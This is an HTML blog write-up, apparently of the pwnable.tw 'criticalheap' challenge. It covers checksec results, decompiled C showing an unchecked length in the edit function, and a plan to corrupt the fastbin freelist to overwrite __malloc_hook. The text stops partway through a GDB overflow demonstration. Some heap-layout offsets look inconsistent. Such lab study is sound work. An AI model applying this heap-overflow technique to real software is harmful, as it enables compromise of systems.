@@ -1,0 +1,1524 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>criticalheap | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4DD;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 600px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 100px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">criticalheap</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>criticalheap</h1>
+  <p class="hero-subtitle">A critical heap exploitation challenge &mdash; leveraging heap overflow to corrupt fastbin freelist, hijacking allocation to overwrite <code class="inline">__malloc_hook</code> with a one_gadget for instant shell.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">200 pts</span>
+    <span class="hero-tag tag-arch">i386 (32-bit ELF)</span>
+    <span class="hero-tag tag-vuln">Heap Overflow + Fastbin Corruption</span>
+    <span class="hero-tag tag-nx">NX Enabled</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Connection</td><td class="value"><code class="inline">nc chall.pwnable.tw 10100</code></td></tr>
+        <tr><td class="label">Binary</td><td class="value">criticalheap (32-bit ELF, i386)</td></tr>
+        <tr><td class="label">Points</td><td class="value">200</td></tr>
+        <tr><td class="label">Description</td><td class="value">Critical heap exploitation challenge</td></tr>
+      </table>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec criticalheap
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Partial RELRO</td><td class="partial">GOT is writable &mdash; we can overwrite GOT entries</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack buffer overflows are mitigated</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode on stack/heap &mdash; must use ROP, hooks, or GOT overwrite</td></tr>
+        <tr><td class="label">No PIE</td><td class="off">Binary addresses are fixed &mdash; known GOT/PLT/symbol addresses</td></tr>
+      </table>
+
+      <h3>Running the Binary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ ./criticalheap
+----------------------
+   Critical Heap
+----------------------
+ 1. Create object
+ 2. Delete object
+ 3. Edit object
+ 4. Show object
+ 5. Exit
+----------------------
+Your choice :1
+Object size :64
+Data :AAAA
+Success !
+----------------------
+Your choice :3
+Index :0
+Data length :128
+Data :BBBBBBBBBBBBBBBBBBBBBBBB
+Success !</code></pre>
+      </div>
+
+      <p>The binary presents a heap object manager with create, delete, edit, and show operations. The critical observation is that the <strong>edit operation allows specifying a data length independently</strong> from the original allocation size &mdash; this is the root cause of the heap overflow vulnerability.</p>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Red Flag: Separate Size in Edit</div>
+        The edit function accepts a <strong>user-specified data length</strong> that is not validated against the original allocation size. This means we can write past the boundaries of any allocated chunk, corrupting adjacent heap metadata and data &mdash; a classic <strong>heap overflow</strong> vulnerability.
+      </div>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>Object Management Structure</h3>
+      <p>The binary maintains a global array of object pointers, each object tracked by index. The key data structures:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">// Global object tracking
+struct object {
+    char *data;        // +0x00: pointer to heap-allocated data buffer
+    int size;          // +0x04: stored allocation size
+};
+
+struct object *objects[16];  // Global array at 0x804b060
+int obj_count = 0;</code></pre>
+      </div>
+
+      <h3>create_object()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void create_object() {
+    if (obj_count &lt; 16) {
+        obj = malloc(8);                   // Allocate object struct (8 bytes)
+        printf("Object size :");
+        read(0, size_str, 8);
+        size = atoi(size_str);
+        obj-&gt;data = malloc(size);          // Allocate data buffer
+        obj-&gt;size = size;
+        printf("Data :");
+        read(0, obj-&gt;data, size);         // Read data into buffer
+        objects[obj_count] = obj;
+        obj_count++;
+        puts("Success !");
+    }
+}</code></pre>
+      </div>
+
+      <p>The <code class="inline">create_object</code> function allocates both an 8-byte object struct and a user-sized data buffer. The size is stored in the struct for later reference &mdash; but as we'll see, the edit function doesn't always honor it.</p>
+
+      <h3>delete_object()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void delete_object() {
+    printf("Index :");
+    read(0, idx_str, 4);
+    idx = atoi(idx_str);
+    if (idx &gt;= 0 &amp;&amp; idx &lt; obj_count &amp;&amp; objects[idx]) {
+        free(objects[idx]-&gt;data);         // Free data buffer
+        free(objects[idx]);                // Free object struct
+        objects[idx] = NULL;               // Pointer is NULLed (no UAF here)
+        puts("Success !");
+    }
+}</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Note: No UAF</div>
+        Unlike many heap challenges, <code class="inline">delete_object</code> properly NULLs out the pointer after freeing. This means we <strong>cannot</strong> use a Use-After-Free approach. The vulnerability must come from somewhere else &mdash; and that's the heap overflow in the edit function.
+      </div>
+
+      <h3>edit_object() &mdash; The Vulnerable Function</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void edit_object() {
+    printf("Index :");
+    read(0, idx_str, 4);
+    idx = atoi(idx_str);
+    if (idx &gt;= 0 &amp;&amp; idx &lt; obj_count &amp;&amp; objects[idx]) {
+        printf("Data length :");
+        read(0, len_str, 8);
+        length = atoi(len_str);
+        printf("Data :");
+        read(0, objects[idx]-&gt;data, length);  // BUG: length is NOT checked!
+        puts("Success !");
+    }
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability: Heap Overflow</div>
+        The <code class="inline">edit_object</code> function reads a <strong>user-controlled length</strong> and uses it directly in <code class="inline">read()</code> without comparing it against <code class="inline">objects[idx]-&gt;size</code>. This allows us to:<br>
+        &bull; Write far past the allocated buffer boundary<br>
+        &bull; Overwrite adjacent chunk headers (size field, prev_size, fd/bk pointers)<br>
+        &bull; Corrupt fastbin freelist metadata to achieve arbitrary write
+      </div>
+
+      <h3>show_object()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void show_object() {
+    printf("Index :");
+    read(0, idx_str, 4);
+    idx = atoi(idx_str);
+    if (idx &gt;= 0 &amp;&amp; idx &lt; obj_count &amp;&amp; objects[idx]) {
+        printf("Data :");
+        write(1, objects[idx]-&gt;data, objects[idx]-&gt;size);
+        putchar('\n');
+    }
+}</code></pre>
+      </div>
+
+      <p>The show function uses the <strong>stored size</strong> to output data, which means it will only leak as many bytes as the original allocation size. However, we can still leak libc pointers if freed chunks end up in the data region of existing objects.</p>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Heap Layout After Creating Objects</h3>
+      <p>Let's create two objects with sizes that put them in the fastbin range and examine the heap layout:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # create_object(64, "A"*8) -> object 0
+gdb-peda$ # create_object(64, "B"*8) -> object 1
+gdb-peda$ heap chunks
+0x0804a000: fastbin 0x10 bytes  [object 0 struct]
+0x0804a010: fastbin 0x50 bytes  [object 0 data: "AAAAAAAA"]
+0x0804a060: fastbin 0x10 bytes  [object 1 struct]
+0x0804a070: fastbin 0x50 bytes  [object 1 data: "BBBBBBBB"]
+0x0804a0c0: top chunk</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">0x0804a000</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a018</span><span class="mem-desc">&larr; obj0-&gt;data pointer</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a004</span><span class="mem-arrow">|</span><span class="mem-data">0x40 (64)</span><span class="mem-desc">&larr; obj0-&gt;size</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a008</span><span class="mem-arrow">|</span><span class="mem-data">[padding]</span></div>
+        <div style="height:6px"></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a010</span><span class="mem-arrow">|</span><span class="mem-data">size: 0x49</span><span class="mem-desc">&larr; chunk header for obj0 data</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a018</span><span class="mem-arrow">|</span><span class="mem-data">"AAAAAAAA"</span><span class="mem-desc">&larr; obj0 data (64 bytes usable)</span></div>
+        <div style="height:6px"></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a060</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a078</span><span class="mem-desc">&larr; obj1-&gt;data pointer</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a064</span><span class="mem-arrow">|</span><span class="mem-data">0x40 (64)</span><span class="mem-desc">&larr; obj1-&gt;size</span></div>
+        <div style="height:6px"></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a070</span><span class="mem-arrow">|</span><span class="mem-data">size: 0x49</span><span class="mem-desc">&larr; chunk header for obj1 data</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a078</span><span class="mem-arrow">|</span><span class="mem-data">"BBBBBBBB"</span><span class="mem-desc">&larr; obj1 data (64 bytes usable)</span></div>
+      </div>
+
+      <h3>Demonstrating the Heap Overflow</h3>
+      <p>When we edit object 0 with a length larger than 64, we overflow into the adjacent chunk (object 1's data):</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # edit_object(0, 128, "A"*64 + p32(0xdeadbeef) + p32(0x0))
+gdb-peda$ x/20wx 0x0804a018
+0x0804a018: 0x41414141 0x41414141 0x41414141 0x41414141
+0x0804a028: 0x41414141 0x41414141 0x41414141 0x41414141
+0x0804a038: 0x41414141 0x41414141 0x41414141 0x41414141
+0x0804a048: 0x41414141 0x41414141 0x41414141 0x41414141
